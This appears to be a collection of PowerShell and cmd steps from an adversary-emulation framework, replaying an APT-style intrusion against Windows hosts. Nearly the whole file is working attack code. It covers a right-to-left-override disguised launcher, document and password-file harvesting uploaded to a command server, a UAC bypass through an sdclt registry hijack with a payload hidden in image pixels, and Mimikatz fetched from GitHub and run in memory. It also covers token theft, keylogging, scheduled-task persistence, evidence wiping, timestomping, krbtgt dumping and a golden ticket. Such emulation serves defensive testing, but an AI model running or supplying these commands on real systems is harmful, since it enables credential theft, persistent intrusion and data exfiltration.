Sleep 3;
$bin = Get-ChildItem *cod*scr*;
$arguments = '-server "#{server}" -group "rtlo_group"';
start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;

if ($?) {
  write-host "Successfully completed RTLO execution. A new agent should appear";
  exit 0;

} else {
  write-host "Failure of RTLO execution.";
  exit 1;
}


powershell.exe;
if ($?) {
  write-host "[*] PowerShell successfully spawned";
  exit 0;
}


$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force


ipconfig /all


arp -a


echo %USERDOMAIN%\%USERNAME%


Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/file/upload";


Import-Module .\ps.ps1 -Verbose -Force;
ProcessList


tasklist /v


sc query


net start


systeminfo


net config workstation


net localgroup administrators


net localgroup administrators /domain


cmd.exe /c net group "Domain Admins" /domain


net user /domain


net user %USERNAME% /domain


reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System


$username="#{profile_user}";
if ( $(test-path -path "C:\Users\$username\Downloads\monkey.png") -eq $false ) {
  copy-item monkey.png -Destination "C:\Users\$username\Downloads\\" -Force;
  if ($? -eq $True) {
    write-host "[+] Successfully copied monkey.png!";
    get-childitem -path "C:\Users\$username\Downloads\\";
    exit 0;
  } else {
    write-host "[+] Failed to copy monkey.png.";
    exit 1;
  }


Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose


if (!(test-path -path $env:windir\system32\sdclt.exe)) {
  write-host "[!] sdclt.exe was not found on this host.";
  exit 1;
}
New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;

$username="#{profile_user}";
$payload='powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName "System.Drawing"; $g=a System.Drawing.Bitmap("C:\Users\$($username)\Downloads\monkey.png");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"';

Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value $payload -Force;
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force;

cmd.exe /c sdclt.exe;
cmd.exe /c powershell.exe;


Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
if (!(test-path -path HKCU:\Software\Classes\Folder)) {
  write-host "[+] Reg keys removed!";
  }


Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
Inject -PoshCode $pcode;


iwr -uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -outfile SysInternalsSuite.zip;
Expand-Archive -Path SysInternalsSuite.zip -DestinationPath "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -Force;

if (! $?) {
  write-host "Error moving files to #{profile_user}\Downloads";
  exit 1;
}

Move-Item Modified-SysInternalsSuite.zip "C:\Users\#{profile_user}\Downloads" -Force;
Expand-Archive -LiteralPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -DestinationPath "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -Force;

if (! $?) {
  write-host "Error expanding files to #{profile_user}\Downloads";
  exit 1;
}

$dir_exists=Test-Path -path "C:\Program Files\SysInternalsSuite";
if ($dir_exists -eq $true) {
  write-host "[*] SysInternalsSuite folder exists within \"C:\Program Files\", copying over payloads then removing folder from Downloads.";
  Move-Item -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
  Move-Item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
} else {
  mkdir "C:\Program Files\SysInternalsSuite";
  Copy-Item -Path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
  Copy-Item -Path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*" -Destination "C:\Program Files\SysInternalsSuite\\" -Force;
}

if (test-path -path "SysInternalsSuite.zip") {
  Remove-Item -path "filesystem::SysInternalsSuite.zip" -force;
}

if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" ) {
  remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip" -force;
}

if (test-path -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite") {
  remove-item -path "C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite" -recurse -force;
}

if (test-path -path "C:\Users\#{profile_user}\Downloads\SysInternalsSuite") {
  Remove-Item -path  "C:\Users\#{profile_user}\Downloads\SysInternalsSuite" -recurse -force;
}

Set-Location -path "C:\Program Files\SysInternalsSuite";
if ($?) {
  gci;
  write-host "[*] Successfully planted files"
} else {
  write-host "[!] Error downloading and planting modified system tools."
}


cmd.exe /c net group "Domain Controllers" /domain


cmd.exe /c net group "Domain Computers" /domain


netsh advfirewall show allprofiles


$ps = get-process;
write-output $ps;


if (! $(test-path -path "C:\Program Files\SysInternalsSuite";)) {
  write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
  exit 1;
}
Set-Location -path "C:\Program Files\SysInternalsSuite";
gci $env:userprofile\Desktop;
.\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\â€®cod.3aka3.scr";
.\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip";
.\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysInternalsSuite.zip";


if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
  write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
  exit 1;
}

Set-Location -path "C:\Program Files\SysInternalsSuite";
if (!(test-path ".\readme.ps1")) {
  Move-Item .\readme.txt readme.ps1 -Force;
}
. .\readme.ps1;
Invoke-Discovery;


netstat -ano


[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
$web = (New-Object System.Net.WebClient);
$result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
iex $result;
function hashdump
{
    Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"
};
hashdump;


Set-Location -path "C:\Program Files\SysinternalsSuite";
if (get-service -name "javamtsup" -ErrorAction SilentlyContinue) {
  write-host "[*] Service already exists...Not running persistence step-1";
  exit 1;
}

if (Test-Path -path "readme.ps1") {
  . .\readme.ps1;
  Invoke-Persistence -PersistStep 1;
  write-host "[+] Persistence 1 invoked.";
  exit 0;

} else {
  write-host "[!] readme.ps1 not found.";
  exit 1;
}


Set-Location -path "C:\Program Files\SysinternalsSuite";
if (Test-Path -path "readme.ps1") {
  . .\readme.ps1;
  Invoke-Persistence -PersistStep 2;
  write-host "[+] Persistence 2 invoked.";

} else {
  write-host "[!] readme.ps1 not found.";
  return 1;
}


Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;


if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
  write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
  exit 1;
}

Set-Location -path "C:\Program Files\SysinternalsSuite";
./accesschk.exe -accepteula .;


Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;


Import-PfxCertificate -Exportable -FilePath ".\dmevals.local.pfx" -CertStoreLocation Cert:\LocalMachine\My;

if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
  write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
  exit 1;
}
Set-Location -path "C:\Program Files\SysinternalsSuite";
. .\readme.ps1;
Get-PrivateKeys;
if ($? -eq $True) {
    write-host "[+] Successfully executed private key collection script.";
    exit 0;
} else {
    write-host "[!] Error, could not execution Get-PrivateKeys.";
    exit 1;
}


if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
  write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
  exit 1;
}

Set-Location -path "C:\Program Files\SysInternalsSuite";
if (test-path -path ".\psversion.txt" ) {
  move-item .\psversion.txt psversion.ps1 -Force;
}
  write-host "[+] File psversion.ps1 staged to be imported."


if (! $(test-path -path "C:\Program Files\SysinternalsSuite\psversion.ps1";)) {
  write-host "[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped.";
  exit 1;
}

Set-Location -path "C:\Program Files\SysinternalsSuite";
. .\psversion.ps1;
Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName "Screenshot";


$clip_data=get-clipboard;
if ($clip_data.Length -gt 0) {
  write-host "[+] Clipboard data obtained!\n";
  write-host $clip_data;
} else {
  write-host "[!] No clipboard data available!\n";
}


if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
  write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
  exit 1;
}
Set-Location -path "C:\Program Files\SysinternalsSuite";
. .\psversion.ps1;
Get-Keystrokes;
Start-Sleep -Seconds 15;
View-Job -JobName "Keystrokes";


Write-Host "[*] Compressing all the things in download dir";
Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";

Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
if ($?) {
  write-host "[+] Data exfil of download directory completed!";
} else {
  write-host "[!] Data exfil failed!";
}


Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;


Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;


if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
  write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
  exit 1;
}

Set-Location -path "C:\Program Files\SysinternalsSuite";
. .\psversion.ps1;
Ad-Search Computer Name *;


Invoke-Command -ComputerName "$(hostname)" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;


Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;




Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
Get-Screenshot;


ls #{remote.file.share}


move-item Rar.exe -Destination C:\Windows\Temp -Force;
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
cd C:\Windows\Temp;
.\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";


Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";


if (!$(test-path -path "C:\Program Files\SysInternalsSuite")) {
  mkdir "C:\Program Files\SysInternalsSuite";
}
set-location "C:\Program Files\SysInternalsSuite";

if (!$(test-path -path "sdelete64.exe")) {
  iwr -uri "https://download.sysinternals.com/files/SDelete.zip" -outfile sdelete64.zip;
  Expand-Archive sdelete64.zip -force;
}
copy sdelete64.exe C:\Windows\Temp\;
cd C:\Windows\Temp\ ;
.\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
.\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
.\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
remove-item C:\Windows\Temp\sdelete64.exe -force;


write-host "[*] Restarting Computer";
Restart-Computer -Force;


Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force;
Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force;
Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force;
if (test-path -path "$env:APPDATA\OfficeSupplies.7z") {
    Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force; write-host "[+] Successfully removed OfficeSupplies.7z";
} else {
    write-host "[!] File did not exist to be removed!";
}

if (get-job -name "Keystrokes" -ErrorAction SilentlyContinue) {
    Remove-Job -Name "Keystrokes";
    if ($?) {
        write-host "[+] Job \"Keystrokes\" was remove.";
    }
} else {
    write-host "[!] Job \"Keystrokes\" did not exist.";
}

if (get-job -Name "Screenshot" -ErrorAction SilentlyContinue) {
    Remove-Job -Name "Screenshot" -Force;
    write-host "[+] Job \"screenshot\" was removed.";
} else {
    write-host "[*] Job \"screenshot\" does not exist, thus was not removed.";
}
remove-item upload.ps1 -Force;


cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
mstsc /v:127.0.0.2;
sleep 10;
Get-Process -name mstsc;
if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}


Set-Location -Path "C:\Users\#{profile_user_day2}\Desktop";

if(Test-Path -LiteralPath "$env:appdata\Microsoft\kxwn.lock"){
  Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
  Write-Host "Removed old kxwn.lock file";
}

powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;


if (!(test-path -path "$env:appdata\Microsoft\kxwn.lock")) {
  write-host "[!] kxwn.lock was not found on this host.";
  exit 1;
} else {
  . .\timestomp.ps1;
  timestomp -dest "$env:appdata\Microsoft\kxwn.lock";
}


. .\stepTwelve.ps1;
detectav


. .\stepTwelve.ps1;
software;


. .\stepThirteen.ps1;
comp;


. .\stepThirteen.ps1;
domain;


. .\stepThirteen.ps1;
user;


. .\stepThirteen.ps1;
pslist;


. .\stepFourteen_bypassUAC.ps1;
bypass;


. .\stepFourteen_credDump.ps1;


write-host "[+] Successfully downloaded m.exe";


Get-WmiObject -Namespace "root/subscription" -list | findstr /i "__Filter";
if ($?) {
  write-host "[*] WMI script has already executed on this machine. Not loading and executing wmi script.";
  exit 1;
} else {
  . .\stepFifteen_wmi.ps1;
  wmi;
  if ($?) {
    write-host "[+] WMI script has successfully executed!";
    exit 0;
  }
  exit 1;
}


. .\powerview.ps1;
get-netdomaincontroller;


. .\stepSixteen_SID.ps1;
siduser;


. .\invoke-winrmsession.ps1;
$session = invoke-winrmsession -Username "#{target.winrm.username}" -Password "#{target.winrm.password}" -IPAddress "#{target.winrm.remote_host}";
Copy-Item m.exe -Destination "C:\Windows\System32\\" -ToSession $session -force;
if ($?) {
  write-host "[+] Successfully copied m.exe to remote host";
} else {
  write-host "[!] Error, copying and executing m.exe on remote host";
}
Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string


. .\stepSeventeen_email.ps1;
Write-Host "Emails Collected";


try{
  if (!(test-path -path "C:\Windows\Temp\WindowsParentalControlMigration" -ErrorAction Stop)) {
    New-Item -Path "C:\Windows\temp\" -Name "WindowsParentalControlMigration" -ItemType "directory" -force;
  }
} catch {
  write-host "[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt";
  exit 1;
}

if (! (test-path -path "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML")) {
  write-host "[!] Error, MITRE-ATTACK-EVALS.HTML was not found.";
  exit 1;
}
Copy-Item "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration" -force;
. .\stepSeventeen_zip.ps1;
zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
if ($?) {
  write-host "[+] Documents successfully staged for collection.";
}


$err = $(net use y: #{onedrive.url} /user:#{onedrive.username} "#{onedrive.password}" 2>&1);
if($err -Like "*System error 85*") {
  Write-Host "OneDrive net drive is already mounted!";
} elseif($err -Like "*System error 67*") {
  Write-Host "OneDrive net drive mount failed - Check URL!";
  Write-Host "#{onedrive.url}";
  exit 1;
} elseif($err -Like "*System error 1244*") {
  Write-Host "Could not authenticate to OneDrive - Check Creds!";
  Write-Host "User: #{onedrive.username}";
  Write-Host "Password: #{onedrive.password}";
  exit 1;
}

Write-Host "Mount Successful"
Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "y:\WindowsParentalControlMigration.tmp" -Force;
if(!$?){
  exit 1;
}

Write-Host "Copy Successfull"
exit 0;


. .\wipe.ps1;
wipe "m.exe";
wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp";
wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML";


klist purge;
. .\Invoke-Mimikatz.ps1;
invoke-mimikatz -command "kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt";
klist;
invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};


Restart-Computer -Force;
